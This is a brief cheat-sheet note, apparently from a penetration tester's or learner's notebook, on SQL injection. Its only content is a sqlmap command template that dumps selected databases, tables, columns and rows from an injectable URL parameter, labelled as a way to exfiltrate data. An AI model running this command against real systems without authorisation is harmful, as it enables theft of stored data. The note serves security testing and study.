#SQL_Injection 

---

- To exfiltrate data from a DB we use the following command:
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T {table} -D {DB} --start={starting_row} --stop={ending_row} -C {col1,col2}
```
